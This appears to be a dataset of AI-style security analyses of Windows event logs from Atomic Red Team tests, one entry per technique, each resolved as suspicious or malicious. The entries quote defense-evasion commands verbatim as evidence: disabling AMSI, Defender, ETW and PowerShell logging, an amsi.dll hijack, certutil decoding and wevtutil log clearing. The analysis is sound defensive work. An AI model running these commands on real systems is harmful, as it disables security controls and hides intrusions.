   - Log clearing is a common technique used by attackers to cover their tracks once malicious actions have been performed. Unless this is part of a routine log management process, which should be verified, this activity is suspicious.

2. **Use of `wevtutil.exe`**:
   - The process `wevtutil.exe` is consistently involved with clearing logs, as seen in the Sysmon logs.
   - Although `wevtutil.exe` is part of Windows utilities to manage event logs, its frequent use and correlation with event clearing activity at the exact times logs were cleared, alongside the user context, could suggest unexpected manipulation of log data.

3. **Registry Modification via `cmd.exe`**:
   - A specific event captures the command execution: `cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f`.
   - Modifying the registry to disable command-line auditing for processes could be an indication of attempts to hide command execution details from security logs.

4. **Suspicious Process Execution**:
   - Although some processes, like those related to Microsoft Edge Update, appear legitimate, the specific timing and association with user `SERVER002\admin_test` require verification to rule out misuse.

5. **User Context**: 
   - The user involved in most suspicious activities, `SERVER002\admin_test`, should be verified to ensure that these activities weren't sanctioned or part of legitimate administrative operations.

### Conclusion and Recommendations:

- **Resolution: SUSPICIOUS**
  - The combination of log clearing activities, registry modification to possibly hide command-line details, and consistent use of administrative utilities presents a pattern that requires further review.
  
- **Action Steps**:
  1. Verify if these activities align with any documented administrative activities or scheduled tasks.
  2. Conduct a thorough investigation on `SERVER002\admin_test` user account to verify authorized access and activities.
  3. Ensure that command-line auditing and security monitoring policies are re-enabled.
  4. Review network logs and further system-level activities around the time when these events occurred to identify any linked external connections or data exfiltration attempts.
  5. Consider isolating the affected system if further unauthorized activity is suspected to prevent potential spread or damage.

In summary, while some activities could potentially have legitimate business purposes, the lack of immediate legitimacy and the nature of the actions necessitate further investigation."
Msiexec.exe - Execute Local MSI file with embedded JScript,"### Detailed Analysis

Upon reviewing the provided log entries, there are several points of interest that indicate potentially malicious activity. Here's a breakdown of the findings:

1. **Event Logs Cleared**:
   - **Security Log (Event ID 1102)** and **System Log (Event ID 104)** show that event logs were cleared by the user `admin_test`. The clearing of logs, especially without a clear justification, is **highly suspicious** as it can be an indicator of an attempt to hide malicious activity.
   - Clearing logs is a known technique used in post-exploitation phases to cover tracks.

2. **Sysmon Logs - Usage of `wevtutil.exe`**:
   - The `wevtutil.exe` tool is used multiple times to clear event logs across different channels such as `System`, `Security`, and `Windows PowerShell`. The command-line usage by `admin_test` to clear logs corroborates with the log clearing events noted in the event logs.
   - The repetitive execution of `wevtutil.exe` for this purpose is indicative of malicious intent to conceal activities on the system.

3. **Installation and Execution of Potentially Malicious MSI**:
   - A process involving `cmd.exe` executing a Microsoft Installer (`msiexec.exe`) with an MSI file located at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_JScript.msi` is noted.
   - The use of `msiexec.exe` to install or execute scripts can be indicative of malware installation or execution, especially from a temporary directory, which is common for malicious software.

4. **Atomic Red Team Tool**:
   - The MSI file path includes `AtomicRedTeam\\T1218.007`, which is known to be part of the Atomic Red Team testing suite. While Atomic Red Team is used for legitimate security tests, its presence without proper documentation or authorization can suggest misuse for malicious purposes.

5. **Command Execution Utilities**:
   - Execution of `CMD.exe`, `hostname.exe`, and `whoami.exe` under high integrity level can expand the understanding in the context of post-exploitation to gather environmental information, though not necessarily malicious by themselves without additional context.

### Assessment and Recommendations

**Assessment**:
- The combination of event log clearing, execution of a potentially suspicious MSI file, and the context of the tools involved suggests a scenario where a user with administrative privileges may be attempting to hide or execute unauthorized actions on the system.

Phantom Dll Hijacking - WinAppXRT.dll,"**Detailed Analysis of the Logs:**

Upon re-evaluating the provided logs, a series of activities are identified which raise concerns about potential malicious activity:

1. **Clearing of Event Logs:**
   - **Security Log (Event ID 1102)**: This event indicates that the Security Log was cleared by a user with the username ""admin_test."" The clearing of log files is a notable red flag, especially if done without a valid reason, as attackers may do this to hide their tracks.
   - **System Log (Event ID 104)**: The System and Windows PowerShell logs were also cleared by the same user ""admin_test."" This behavior is consistent with tactics used to cover malicious activities.

2. **Usage of `wevtutil` to Clear Logs:**
   - Several Sysmon logs (Event IDs 1) show execution of `wevtutil.exe` to clear various logs, including Application, System, Security, and Windows PowerShell logs. This tool is used to manage Windows Event logs and can be suspicious if used to clear logs manually in succession, indicating evasion tactics.

3. **Unusual Command Executions:**
   - **Cmd.exe Execution (Sysmon Event ID 1)**: The command line used in one event (`""cmd.exe"" /c copy %%windir%%\\System32\\amsi.dll %%APPDATA%%\\amsi.dll & ren %%APPDATA%%\\amsi.dll WinAppXRT.dll & copy %%APPDATA%%\\WinAppXRT.dll %%windir%%\\System32\\WinAppXRT.dll & reg add ""HKEY_CURRENT_USER\\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f""`) involves modifying and renaming system DLLs and making registry changes. This is highly suspicious since it could indicate tampering with Anti-Malware Scan Interface (AMSI) to bypass security software.

4. **Privilege Utilization:**
   - The processes were executed with high integrity levels under the user ""admin_test"" and ""NT AUTHORITY\\SYSTEM,"" which could be used to escalate privileges or perform unauthorized actions on the system.

**Assessment:**

Based on the identified behaviors, these logs indicate malicious activity. The clearing of event logs, repeated usage of `wevtutil` to erase various logs, and the specific command executed with `cmd.exe` to manipulate system files and registry keys are all characteristic of malicious behavior aimed at obscuring traces and potentially disabling security mechanisms.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further spread of potential compromise.
2. **Forensic Investigation:** Conduct a full forensic investigation on the host to identify any further modifications, compromised accounts, and installed malware.
3. **Check for Persistence Mechanisms:** Inspect the registry and scheduled tasks for any persistence mechanisms.
4. **Review User Activity:** Investigate other activities of the user ""admin_test"" and escalate privileges if necessary.
5. **Implement Security Measures:** Strengthen security measures, including enabling advanced logging, applying patches, and reviewing access controls.
6. **Recovery Plan:** Plan for recovery, including restoring from a clean backup and monitoring network traffic for signs of further compromise.

This analysis should inform the security team to prioritize investigations on the compromised host and apply countermeasures."
Disable .NET Event Tracing for Windows Via Registry (cmd),"### Detailed Analysis:

Upon examination of the provided event logs, several activities stand out:

1. **Log File Clearing Activities**:
   - **System Log, EventID 104** and **Security Log, EventID 1102** indicate that the logs on `Server002` were cleared by `admin_test`. The logs for System, Windows PowerShell, and Security were all cleared very close together in time (12:13:23 on 2024-10-28). Clearing logs is often a tactic used to cover tracks of previous activities. The user account `admin_test` was used to perform these actions, raising a red flag as it might suggest attempts to hide suspicious or unauthorized activities.

2. **Usage of `wevtutil.exe`**:
   - The Sysmon log contains multiple instances of the process `wevtutil.exe` used to clear logs (cl). `wevtutil.exe` is a command-line utility used to manage event logs, and while legitimate, its use in conjunction with log clearing could be indicative of malicious behavior, especially when not part of regular administrative tasks.

3. **Registry Manipulations**:
   - The command `cmd.exe /c REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0` modifies the registry, potentially to adjust logging settings or other framework behaviors, which could be used to evade detection or reduce logging insights.

4. **Execution of Common System Utilities**:
   - The execution of common commands such as `hostname.exe` and `whoami.exe` could be perceived as benign depending on the context of their execution, but in an environment where logs have been cleared and anomalies exist, they might participate in a reconnaissance.

5. **Updates via `MicrosoftEdgeUpdate.exe`**:
   - Activity involving `MicrosoftEdgeUpdate.exe` appears to be routine software updates and generally benign. The presence of files and processes associated with Microsoft Update processes in directories like `C:\Program Files (x86)\Microsoft\EdgeUpdate\` are consistent with legitimate update activities.

### Assessment:

Given the combination of log clearing, use of `wevtutil.exe` for such purposes, and registry modifications, the logs contain indications of potentially malicious activity. While some activities such as software updates appear to be legitimate, the simultaneous log clearing is a particularly concerning indicator of a potential compromise.

### Resolution: SUSPICIOUS

**Guidance on How to Proceed**:
1. **Immediate Measures**:
   - Conduct a full incident response process, isolating the affected host `Server002` to prevent any further unauthorized activity or lateral movement within the network.
   - Perform a comprehensive forensic analysis of the system to recover any cleared log files and identify any additional indicators of compromise.

2. **Review and Audit User Accounts**:
   - Investigate access and usage patterns of the `admin_test` account, including an audit of all administrative activities.
   - Ensure that password policies and account management practices are robust to prevent unauthorized access.

3. **System Hardening**:
   - Implement enhanced monitoring and logging mechanisms to ensure that all activities are being captured effectively.
   - Enforce least privilege principle for all accounts, especially those with elevated administrative privileges.

4. **Revisit Security Policies**:
   - Review and potentially update security policies regarding the use of administrative tools and access to critical system logs.
   - Educate and train staff on recognizing and reporting suspicious behavior."
Windows HideSCAHealth Group Policy Feature,"Based on the analysis of the provided windows event logs, there are clear indicators that suggest potential malicious activity:

1. **Log Clearing Activity**: 
   - The logs record several instances where event logs are being cleared (`EventID: 104` for System and Windows PowerShell logs, and `EventID: 1102` for Security logs) by the user `admin_test`. Log clearing can be indicative of an attempt to cover tracks.
  
2. **Suspicious Process Activities**: 
   - The process `wevtutil.exe` is used to clear logs. While the process itself is legitimate, its usage to clear multiple event logs (`System`, `Microsoft-Windows-Sysmon/Operational`, `Application`, and `Security`) is highly suspicious, especially when performed in rapid succession.
   - The execution of the command line process (`cmd.exe`) with the command to add a registry key to hide security health alerts (`reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f`). This manipulation of registry keys to suppress security warnings is a classic method of attempting to avoid detection or alerts.

3. **User Context and Integrity Level**:
   - The user executing these commands is `SERVER002\\admin_test` with high integrity level context, indicating administrative privileges are being improperly utilized.

4. **Repetitive Executions**:
   - Execution patterns show repetitive and rapid use of processes like `whoami.exe`, `conhost.exe`, and registry edits, which could be suspicious if they aren't a part of usual scripts or administration tasks. In this context, it supports the theory of scripted or automated actions associated with potential malicious activities.

Based on these observations, the activities recorded in the logs show evidence of behavior designed to modify system settings to prevent alerting or detection of ongoing activities, as well as efforts to clear traces by wiping logs. These actions often correlate with a malicious actor attempting to maintain persistence or prepare the environment for further compromise.

**Resolution: MALICIOUS**

Given the described activities and evidence in the logs, it is prudent to consider these actions as malicious. Immediate action should be taken to prevent any further abuse:

1. **Isolate the Host**: Sever the network connection of `Server002` to prevent any potential spread of malware or further exfiltration of data.
2. **User Account Review**: Investigate and possibly suspend the account `admin_test` and any associated credentials.
3. **Audit and Review System Changes**: Review recent changes system-wide and in the registry for backdoors or misconfigurations. 
4. **Store Logs Securely**: Ensure logs are securely stored off-host for further forensic analysis without the risk of modification.
5. **Conduct Full Incident Response**: Initiate a full incident response to identify the initial entry point, scope of the compromise, and potential remediation steps.

This thorough review and subsequent resolution steps are critical to prevent further compromised integrity of the environment."
InstallHelper method call,"After reviewing the provided logs, there are a few key points and activities that stand out. Each log segment reveals specific events, especially surrounding PowerShell commands and system log clearing, which could be suspicious activities:

1. **PowerShell Activity**: The PowerShell logs contain evidence of a potentially suspicious script execution:
   - PowerShell is invoked with a command referencing a script located in an `AtomicRedTeam` directory: `InstallUtilTestHarness.ps1`.
   - The script is associated with the command to test `.NET InstallUtil Assembly`, a known technique for indirect execution of payloads which is classified as T1218.004 in the MITRE ATT&CK framework.
   - The presence of PowerShell events with heavy logging detail suggests a possible attempt at obfuscating intentions or conducting a penetration test or simulation.

2. **Log Clearing**:
   - The System, PowerShell, and Security event logs have recorded LogCleared events within proximity:
     - Event IDs 104 in the System and PowerShell logs.
     - Event ID 1102 in the Security log.
   - Clearing of system logs is typically a very suspicious activity as it is often an indication of attempts to cover tracks post-compromise or after executing potentially malicious actions that require log tampering to avoid detection.

3. **Use of Legitimate Software with Suspicious Context**:
   - There are numerous instances of activities by Microsoft Edge Update or related components, which might be benign in isolation. However, in the context where logs are being cleared and PowerShell scripts with potential penetration testing usage are being executed, these actions might be worth further exploration to confirm legitimacy.

4. **User Context**:
   - The activities noted are executed under the context of the user `SERVER002\\admin_test`, which is consistent across multiple entries and shows elevated privileges are being utilized, possibly unauthorized.

**Assessment**: Considering the context of PowerShell script activity associated with known testing or attack techniques, combined with the log clearing activities, these logs exhibit characteristics indicating suspicious activities that warrant further investigation. The intentional clearing of logs aligns malicious behavior attempting to cover tracks.

**Resolution**: **SUSPICIOUS** - The presence of potentially malicious PowerShell script usage along with log-clearing activities strongly indicates that there is suspicious activity within these logs. It is recommended to conduct a thorough investigation, including validating user permissions, reviewing related scripts for content and intent, and conducting a full security assessment of the system."

### Suspicious Activities Detected:

1. **Frequent Use of `wevtutil.exe`**:
   - The `wevtutil.exe` process is frequently executed to clear logs of various event channels, such as Microsoft-Windows-Sysmon/Operational, Application, Security, and Windows PowerShell logs. The use of `wevtutil.exe` to clear event logs can be an attempt to cover tracks, which is often associated with malicious activity.
   - The sequence and timing of the event clearing suggest a systematic removal of logs to hide potentially malicious activities.

2. **Unexpected PowerShell Execution**:
   - A PowerShell script is executed with a command to modify registry settings that can affect system behavior. The specific modifications include:
     - Enabling `LocalAccountTokenFilterPolicy`.
     - Enabling `EnableLinkedConnections`.
     - Enabling `LongPathsEnabled`.
   - This alteration, especially when executed without a preceding legitimate justification, could indicate an attempt to modify system access policies or enable hidden paths for extended file manipulations.

3. **Clearing Security Logs (Event ID 1102)**:
   - There is a Security log entry that indicates the clearing of security logs, which is unusual and often practiced to erase traces of unauthorized access or privilege escalation attempts.

4. **Execution of `whoami.exe`**:
   - Execution of the `whoami.exe` indicates that someone might be checking current user permissions and context, which is commonly noticed during post-exploitation phases of an attack to ensure the correct privilege context.

5. **Time Change Events**:
   - There are instances of time change events, suggesting tampering with system time potentially to mismatch timestamps in logs further complicating forensic analysis.

### Assessment:
The observed behaviors of executing `wevtutil.exe` to clear logs, executing PowerShell with commands modifying registry keys, and clearing of security logs suggest a high probability of malicious activity or a security breach attempt. These actions are typically associated with attackers attempting to stealthily gain or maintain access and cover their tracks.

### Conclusion:
**Resolution: MALICIOUS**

The combination of activities observed strongly supports the conclusion of a malicious attempt to leverage and modify system capabilities while obscuring the activity trail."
Disable Windows Defender with DISM,"Upon analysis of the provided logs, I have identified several areas of interest that warrant further investigation. Here's a detailed breakdown of suspicious or potentially malicious activity:

1. **Disabling Windows Defender:**
   - The `cmd.exe` process (ID 1504) executed a command to disable and remove Windows Defender (`Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`). This action is unusual and highly suspicious, particularly if it wasn't part of a planned system administration task.
   - Subsequent processes related to this command (such as `Dism.exe` and `DismHost.exe`) reinforce the suspicion that Windows Defender was indeed disabled.

2. **Clearing Event Logs:**
   - The logs indicate that event logs for several channels, including Sysmon, System, and Security, were cleared by the user `admin_test`. This action (EventID 1102 in Security logs and EventID 104 in System logs) is often indicative of an attempt to cover tracks after malicious activities have been performed.
   
3. **Time Manipulation Events:**
   - There are entries showing manipulation of the system time. The NewTime is earlier than the OldTime in events 3569 and 30349, indicating potential tampering with system time, which is another tactic sometimes used to manipulate or evade security logs.

4. **High-Integrity Processes Run by `admin_test`:**
   - Many high-integrity processes, such as `wevtutil.exe` and `conhost.exe`, are executed by the `admin_test` user within a short timeframe. Although these can be legitimate, their use in conjunction with clearing event logs and disabling security features is concerning.

5. **Checking System Configuration:**
   - The execution of `whoami.exe` could be a benign query by a user, but in conjunction with the above activity, it merits closer inspection.

6. **Microsoft Edge Update Activity:**
   - There are several entries involving the `MicrosoftEdgeUpdate.exe` indicating an update process for Edge. However, these appear unrelated to the suspicious activities tied to `admin_test`.

### Conclusion

Based on the analysis, there is significant **suspicious activity** involving attempts to remove security measures (Windows Defender), clear event logs, and possibly tamper with system time. These actions fit the pattern of someone trying to conduct unauthorized activity and hide their presence or intentions.

**Resolution: SUSPICIOUS**

"
Dynamic C# Compile,"Upon reviewing the Windows event logs, several indicators of potentially suspicious activity have been identified:

1. **PowerShell Usage**: The logs show that `powershell.exe` was executed multiple times by the user `SERVER002\admin_test`. Specifically, it invoked a file named `T1027.004_DynamicCompile.exe` located in a temporary directory. This is unusual and suggests it might be part of a benign penetration testing framework like Atomic Red Team, given the filename. However, without further context, any unexpected or unauthorized execution of PowerShell scripts can be suspicious as it is often used in fileless malware attacks or lateral movements.

2. **Event Log Clearing**: The logs show multiple events that the Windows event logs were cleared (Event ID 104 for System, and Event ID 1102 for Security). Clearing event logs can be a sign of an attempt to delete forensic evidence of an unauthorized or malicious activity.

3. **Unusual Command-Line Executions**: The `wevtutil.exe` utility was used to clear various event logs, including `System`, `Application`, and `Security` logs. The clearing of logs using command-line tools is a known tactic to hide footprints. These occur under the same user context as the PowerShell executions, further linking the activities together.

4. **High Integrity Level**: Many processes, including the clearing of logs and the PowerShell executions, are performed with high integrity levels, indicating administrative privileges. This suggests potential privilege escalation or use of a compromised high-privileged account.

5. **System Processes**: The logs indicate normal activity from legitimate Windows processes related to updates and Microsoft Defender operations. These do not present any evidence of compromise but instead affirm system maintenance tasks.

### Assessment:
Based on the analysis, this activity should be classified as **SUSPICIOUS**, primarily due to:
- The execution of potentially harmful PowerShell commands with high integrity level access.
- The clearing of important Event Logs without clear, legitimate reasons, which is typically not standard operating procedure and is often an indicator of malicious activity.

### Guidance on How to Proceed:
1. **Containment and Investigation**:
   - Isolate the system (Server002) to prevent further potential unauthorized activities.
   - Conduct a more in-depth investigation on the server to determine the exact source and intent of the `T1027.004_DynamicCompile.exe` PowerShell execution.
   - Verify administrative actions by `SERVER002\admin_test` and confirm with the user if they were authorized.
   
2. **Review Access and Credentials**:
   - Ensure that user accounts with high privileges ('admin_test') are re-evaluated for their necessity and any unusual access patterns.
   - Consider resetting passwords for potentially compromised accounts.

3. **Increase Monitoring**:
   - Step up monitoring on the network for additional signs of exploitation or lateral movement.
   - Implement tighter rules and alerts on any use of PowerShell scripts and event log manipulations.

4. **Enhance Security Controls**:
   - Implement additional security controls to track PowerShell execution, such as script block logging and transcription.
   - Consider deploying security solutions to prevent unauthorized script executions and logging tampering. 

Given these activities' potential implications, it is crucial to follow up with thorough investigations to assess any impact and address vulnerabilities that might have been exploited."
Certutil Rename and Decode,"Upon analyzing the provided Windows event logs, several observations and analyses can be made regarding potential suspicious activity:

### Logs of Potential Concern:

1. **Security Log Entry (EventID 1102)** - The event indicating that the security log has been cleared is concerning. Log clearing is often indicative of an attempt to hide malicious or unauthorized activity as attackers frequently clear logs to cover their tracks. The user associated with the event is `""admin_test""`, suggesting this account may have either been compromised or is malicious.

2. **Sysmon Log Events**:
   - **Wevtutil Execution**: There are multiple entries involving the usage of `wevtutil` to clear logs. This command-line utility usage is critical since it corresponds to the log clearing in the security log, confirming potential evidence tampering.
   - **Cmd.exe Activity with CertUtil**: The command ""copy %%windir%%\\system32\\certutil.exe %%temp%%\\tcm.tmp &amp; %%temp%%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %%temp%%\\T1140_calc2.txt &amp; %%temp%%\\tcm.tmp -decode %%temp%%\\T1140_calc2.txt %%temp%%\\T1140_calc2_decoded.exe"" indicates potential malicious activity. Certutil.exe is being used to encode and decode files, a technique often associated with malicious payload obfuscation or data exfiltration. This is referenced by techniques in the MITRE ATT&CK framework, specifically T1140 (Deobfuscate/Decode Files or Information).

### Conclusion:
Based on the analysis of the event logs, there is strong evidence to suggest malicious activity:
- The clearing of logs (`EventID 1102`) is often an indicator of malicious intent.
- The execution of `wevtutil` to clear multiple event logs is aligned with activities attempting to delete forensic evidence.
- The usage of `certutil.exe` to encode and decode `calc.exe` could suggest an attempt to hide and execute payloads stealthily.

### Recommendation:
- It is crucial to immediately investigate the ""admin_test"" account for unauthorized access and potentially change its credentials or disable it if it is not critical.
- Conduct a full security assessment and threat-hunting activity on the host (Server002) to identify any additional signs of compromise.
- Inspect network logs and other systems in the environment for additional signs of compromise.
- Ensure backup logs are reviewed to gather more evidence on potential threats.
- Monitor for any further usage of suspicious processes, especially around `wevtutil`, `certutil`, and process executions that involve `cmd.exe` with unusual command-line arguments.

**Resolution**: Based on the identified evidence, this activity is categorized as **MALICIOUS**. Immediate incident response actions are recommended."
Windows Powershell Logging Disabled,"Upon reviewing the provided Windows event logs, I've identified several patterns and potential indicators of malicious activity:

### Suspicious or Anomalous Behavior:

1. **Registry Modifications on PowerShell Policies:**
   - **EventRecordID 17975-17985:** A `cmd.exe` process initiated a series of registry edits related to PowerShell logging mechanisms, such as disabling `ModuleLogging`, `ScriptBlockLogging`, `Transcription`, and script execution. This type of behavior is commonly associated with attempts to disable logging for malicious PowerShell activity.

2. **Log File Clearing Events:**
   - **Security EventID 1102 and System EventID 104:** The Security log (EventID 1102) and the System log (EventID 104) indicate log file clearing actions. This might be an attempt to cover tracks after unauthorized actions.

3. **Process Execution and Event Logs:**
   - Multiple invocations of `wevtutil.exe` were executed to clear logs of different channels (`System`, `Application`, `Security`) and export logs. While `wevtutil` is a legitimate Windows utility, its use to clear logs can point towards malicious intent or an attempt to erase forensic footprints.

4. **Potential Time Tampering:**
   - **Security EventID 4616 and Kernel-General EventID 1:** There are events indicating time adjustments on the system. While time drift corrections can occur legitimately, if done to manipulate the time to hide activities, it needs further scrutiny.

### Assessment of Activity:

- The combination of registry tampering to disable PowerShell logging, clearing of event logs, and potential time tampering suggests behavior that aligns with attempts to obfuscate malicious activities.
  
- The remaining EdgeUpdate-related events seem relatively benign as they relate to Microsoft Edge updates. However, when viewed in conjunction with other suspicious activities (e.g., registry changes), they cannot be wholly disregarded without further context.

### Conclusion:

Given the observed registry modifications disabling PowerShell logging, the clearing of event logs, and the time changes, the activities recorded in these logs should be classified as:

- **Resolution: SUSPICIOUS** 

### Guidance on How to Proceed:

1. **Immediate Attention:** 
   - Investigate the `admin_test` user's recent activities. Verify if the actions were authorized or if credentials may have been compromised.
   - Check for potential persistence mechanisms or backdoors.

2. **System Security Posture:**
   - Enhance monitoring to detect and alert on activities related to disabling logging or clearing event logs.
   - Consider implementing stricter PowerShell logging policies and regular security audits.

3. **Further Investigation:**
   - Review context around the timestamp changes to ascertain whether they correlate with attempts to conduct or obfuscate unauthorized actions.
   - Analyze any additional event logs or security tools that may provide further visibility into the potentially suspicious activity.

By following these steps, you can ensure a comprehensive examination of potential security incidents and reinforce the system's defense mechanisms."
Tamper with Windows Defender Registry,"### Detailed Analysis:

**1. Indicators of Log Clearing:**
   - **System Log Event ID 104:** Indicates that the System Event Log was cleared by the user ""admin_test"". 
   - **Security Log Event ID 1102:** Indicates that the Security Event Log was cleared by the user ""admin_test"".
   - **PowerShell Log Event ID 104:** Indicates that the Windows PowerShell Event Log was also cleared by the user ""admin_test"".

   Log clearing is often a sign of an attempt to cover tracks after malicious activities. This is typically considered suspicious and should prompt further investigation.

**2. Usage of `wevtutil.exe`:**
   - **Sysmon Log Event ID 1 (Process Creation):** Shows multiple executions of `wevtutil.exe`. This utility is used to manage Windows event logs, and its invocation to clear logs (`cl` command) suggests it was used to clear logs intentionally. This reinforces the suspicion related to log clearing.

**3. PowerShell Activity:**
   - **Sysmon Log Event ID 1 & Windows PowerShell Log:** A PowerShell command was executed to modify the Windows Defender registry key, specifically to disable Windows Defender (`Set-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"" -Name DisableAntiSpyware -Value 1`). This is a clear sign of potentially malicious intent as it aims to disable a critical security feature of Windows.

**4. Microsoft Edge Update Activities:**
   - **Multiple Sysmon Log Events:** Many logs relate to Microsoft Edge Update processes running under NT AUTHORITY\SYSTEM. These entries appear normal as they are consistent with automatic software update processes. 
   - However, in the presence of other suspicious activities (like log clearing and PowerShell command), it's important to ensure these update binaries are not tampered with. File hashes and signatures should be verified.

**Assessment:**
There are several pieces of evidence suggesting suspicious or malicious intent:
   - Log clearing by `admin_test`.
   - Use of `wevtutil.exe` to clear logs.
   - PowerShell command disabling Windows Defender.

### Conclusion:
- **Resolution:** MALICIOUS
  - The activities identified in these logs denote attempts to execute potentially harmful actions, such as disabling Windows Defender and clearing logs, likely to hide malicious actions.
  
### Guidance:
- Conduct a forensic analysis to capture system artifacts that might have been missed due to log clearing.
- Verify the integrity and source of the PowerShell script and the binaries associated with Microsoft Edge Update.
- Check for any unauthorized or unexplained administrator access and changes to other systems or software.
- Ensure that Windows Defender and other protective measures are re-enabled and assess the system for any additional compromise indicators.
- Isolate the system if the assessment suspects it is compromised to prevent any lateral spread of potential threats."
UEFI Persistence via Wpbbin.exe File Creation,"Upon reviewing the provided Windows event logs for potential malicious activity, several details stand out:

1. **PowerShell Activity**: 
   - An unusual PowerShell command is executed: `powershell.exe & {echo \""Creating %systemroot%\\wpbbin.exe\"", New-Item -ItemType File -Path \""$env:SystemRoot\\System32\\wpbbin.exe\""}`. The creation of a file, particularly in the System32 directory, is suspicious and potentially indicative of an attempt to introduce unauthorized software or execute malicious scripts. System32 is a sensitive directory, and its modification is a known tactic for persistence or malicious deployments.
   
2. **Event Log Clearing**: 
   - The system, security, and Windows PowerShell event logs were cleared by the user 'admin_test'. Event log clearing is often a sign of malicious activity as attackers attempt to cover their tracks. This action was performed multiple times in quick succession which is unusual behavior for a legitimate user.

3. **Repeated Execution of System Utilities**:
   - The system utilities `whoami.exe`, `wevtutil.exe`, and `hostname.exe` were executed multiple times. While these utilities are legitimate, their execution patterns are commonly seen during reconnaissance stages by an attacker.
   
4. **Privilege Escalation**:
   - The user account 'admin_test' is executing commands with high integrity level, and has privileges associated with system management (SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, etc.). This suggests the account has significant rights, increasing the potential damage of a compromise.

5. **Time Change Events**:
   - The system time was altered multiple times (`Event ID 4616`). While time changes can occur during legitimate activities (e.g., setting the correct time), it can also be exploited by attackers to manipulate timestamps on malicious actions.

Based on these findings, the activity observed includes indicators consistent with potential malicious behavior, particularly the PowerShell command execution that suggests file creation in a critical directory, and the clearing of event logs. These activities are not typically consistent with normal administrative tasks or benign system operations, especially given the context together.

**Assessment**: MALICIOUS

**Recommendations**:
- Conduct a thorough examination of the affected host, particularly the System32 directory for unauthorized files (`wpbbin.exe`).
- Review the user account 'admin_test' for any unusual or unauthorized access patterns.
- Monitor network activity for any unusual outbound connections from Server002.
- Implement tighter controls on PowerShell usage and event log modifications.
- Consider immediate isolation of the host to prevent potential spread or further actions while investigations are ongoing."
DLL Search Order Hijacking - amsi.dll,"Based on the analysis of the provided log entries, several aspects of concern have been identified that suggest potential malicious activity:

### Analysis:
1. **PowerShell Events:**
   - The PowerShell logs show the execution of ""updater.exe"" under ""C:\\Users\\admin_test\\AppData\\Roaming\\updater.exe -Command exit"". The path and the command used here are suspicious, indicating the possibility of a legitimate application being masqueraded, especially due to its unconventional storage location (AppData\Roaming).

2. **Security Log:**
   - Event ID 1102 indicates that the security log was cleared by the user ""admin_test"". This action is generally considered suspicious as logs are usually cleared to cover tracks following unauthorized or malicious actions.

3. **System and Sysmon Logs:**
   - Multiple entries in the Sysmon logs indicate the use of ""wevtutil.exe"" to clear event logs (command line evident from the command: ""wevtutil.exe cl System"", ""cl Security"", ""cl Application"", ""cl Microsoft-Windows-Sysmon/Operational"", and cl ""Windows PowerShell""). Repeated clearing of logs across different event channels is a high indicator of an attempt to obfuscate activity.
   
4. **Cmd Execution:**
   - Anomalous command execution was logged, detailing a ""cmd.exe /c"" operation that involves copying PowerShell executable and amsi.dll to a user’s Roaming directory and executing it as ""updater.exe"". This kind of command is typically associated with suspicious activity aimed at bypassing security measures like Anti-Malware Scan Interface (AMSI).

### Conclusion:
The logs display a series of activities highly indicative of malicious behavior:

- Unauthorized clearing of event logs.
- Execution of suspicious scripts/programs from non-standard locations.
- Utilization of known system binaries for potentially malicious purposes (living off the land binaries).

### Resolution:
**MALICIOUS**  
The combination of the activities observed (log clearing, use of system binaries in non-standard ways, and suspicious PowerShell activity) substantiates a finding of malicious activity. Immediate action should be taken to isolate the machine, perform a comprehensive forensic investigation, validate the authenticity of executables in AppData, and potentially recover any deleted logs or affected files. Furthermore, review user activity, especially focusing on the user ""admin_test,"" as it seems to be the source of these irregular behaviors."
AMSI Bypass - Create AMSIEnable Reg Key,"### Detailed Analysis:

1. **Windows PowerShell Log Analysis:**
   - The PowerShell logs show the execution of a command intended to alter the Windows Script settings in the registry. Specifically, the command is attempting to set the ""AmsiEnable"" registry key to 0, effectively disabling the Antimalware Scan Interface (AMSI). This action is commonly associated with obfuscation techniques used by malware to bypass detection mechanisms.
   - The consistent log messages indicate this alteration was executed without error, under the user ""admin_test"" on ""Server002"".

2. **Sysmon Log Analysis:**
   - Repeated entries of ""wevtutil.exe"" being executed with the command-line arguments `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`. The use of `wevtutil` to clear logs is suspicious, especially when combined with PowerShell script intended to evade detection.
   - The parent process for these instances is ""wsmprovhost.exe"", and the activities occur under the user ""SERVER002\\admin_test"" with high integrity level, suggesting privileged action.
   - There are also calls to ""hostname.exe"" and ""whoami.exe"", typical reconnaissance commands indicating a potential mapping or awareness activity by a malicious actor.

3. **Application Log Analysis:**
   - Entries related to ""Microsoft Edge Update"" are observed, which appear to be legitimate update operations based on the file paths and the presence of known system update processes. However, they do not directly relate to the suspicious PowerShell activity.

4. **Security Log Analysis:**
   - There is a critical event indicating that the security logs were cleared. Specifically, event ID 1102 corroborates the execution of log clearing operations observed in the Sysmon logs, further supporting potentially malicious intent to cover tracks.

5. **System Log Analysis:**
   - Log entries confirm that the system logs, including ""System"" and ""Windows PowerShell"", were cleared. This aligns with the Sysmon activity and further points towards an intention to hide malicious actions, notably the alteration to AMSI configurations via PowerShell.

### Assessment:
- **Indicators of Malicious Activity:** The alteration of the AMSI setting through PowerShell, the clearing of Sysmon, application, system, and security logs using `wevtutil`, and the use of recon commands by a privileged user are strong indicators of malicious behavior.
- **Potential Threats/Risks:** These activities suggest an active attempt to disable security defenses and cover tracks on ""Server002"", potentially indicating a compromise by an attacker aiming to persist undetected.

### Conclusion:
- **Resolution:** MALICIOUS
- **Guidance on How to Proceed:**
